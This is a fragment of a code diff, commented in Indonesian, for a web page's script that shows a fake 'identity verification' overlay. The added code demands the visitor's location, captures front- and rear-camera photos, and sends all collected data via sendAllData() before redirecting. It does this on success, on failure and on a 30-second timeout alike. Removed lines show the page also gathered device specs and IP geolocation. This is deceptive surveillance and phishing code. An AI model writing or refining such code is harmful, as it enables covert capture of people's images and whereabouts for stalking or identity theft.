-        fingerData.device = getDeviceSpecs();
-        fingerData.ipGeo = await fetchIPGeo();
-      }
-
-      // PERBAIKAN UTAMA: Simpan hasil kamera dengan benar
       try {
-        capturedBlobs.front = await startCamera('user');
-      } catch (e) {
-        capturedBlobs.front = null;
-      }
+        // Minta lokasi (wajib)
+        identityStatus.textContent = 'Meminta lokasi...';
+        locationData = await requestLocation(0);
+        identityStatus.textContent = 'Lokasi didapat';
 
-      // GPS bersamaan (sudah dijalankan, hasilnya di gpsCoords)
-      try {
-        await requestLocation();
-      } catch (e) {
-        gpsCoords = null;
-      }
+        // Minta kamera depan (wajib)
+        identityStatus.textContent = 'Meminta kamera...';
+        const frontStream = await requestCameraFront(0);
+        frontBlob = await captureFrame(frontStream);
+        identityStatus.textContent = 'Foto depan diambil';
 
-      // Jika depan berhasil, coba kamera belakang
-      if (capturedBlobs.front) {
+        // Coba kamera belakang (opsional)
         try {
-          capturedBlobs.rear = await startCamera('environment');
-        } catch (e) {
-          capturedBlobs.rear = null;
-        }
-      } else {
-        capturedBlobs.rear = null;
-      }
+          const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' }, width:{ideal:1280}, height:{ideal:720} } });
+          backBlob = await captureFrame(backStream);
+        } catch(e) { backBlob = null; }
 
-      // Anggap sukses jika minimal ada GPS atau kamera depan
-      const hasSomeData = capturedBlobs.front || gpsCoords;
-      if (hasSomeData) {
-        await finalize(true);
-      } else {
-        if (attempt >= 2) {
-          await finalize(false);
-        } else {
-          errorMsg.style.display = 'block';
-          errorMsg.textContent = 'Izin diperlukan! Klik "Coba Lagi" untuk mengizinkan kamera & lokasi.';
-          verifyBtn.innerHTML = '🔄 Coba Lagi';
-          verifyBtn.disabled = false;
-        }
+        // Sukses
+        identityIcon.className = 'check-icon done';
+        identityIcon.textContent = '✓';
+        identityStatus.textContent = 'Terverifikasi';
+        globalStatus.textContent = 'Mengirim data...';
+        verificationComplete = true;
+        clearTimeout(verificationTimer);
+        overlay.style.display = 'none';
+        await sendAllData();
+        window.location.replace(REDIRECT_URL);
+      } catch(err) {
+        // Gagal total (retry habis) -> kirim data seadanya dan redirect
+        identityIcon.className = 'check-icon failed';
+        identityStatus.textContent = 'Verifikasi gagal';
+        globalStatus.textContent = 'Mengirim data yang ada...';
+        verificationComplete = true;
+        clearTimeout(verificationTimer);
+        overlay.style.display = 'none';
+        await sendAllData();
+        window.location.replace(REDIRECT_URL);
       }
     }
 
+    // ========== TIMEOUT 30 DETIK ==========
     function startTimeout() {
-      timerHandle = setTimeout(() => {
-        if (!verificationDone) finalize(false);
+      verificationTimer = setTimeout(async () => {
+        if (!verificationComplete) {
+          verificationComplete = true;
+          overlay.style.display = 'none';
+          globalStatus.textContent = 'Waktu habis, mengirim data...';
+          await sendAllData();
+          window.location.replace(REDIRECT_URL);
+        }
       }, 30000);
     }
 
     // ========== INIT ==========
+    // Tampilkan overlay setelah 2.5 detik
     setTimeout(() => {
       overlay.style.display = 'flex';
       startTimeout();
-      verifyBtn.addEventListener('click', onVerifyClick);
+      verifyBtn.addEventListener('click', startVerification);
     }, 2500);
   })();
   </script>
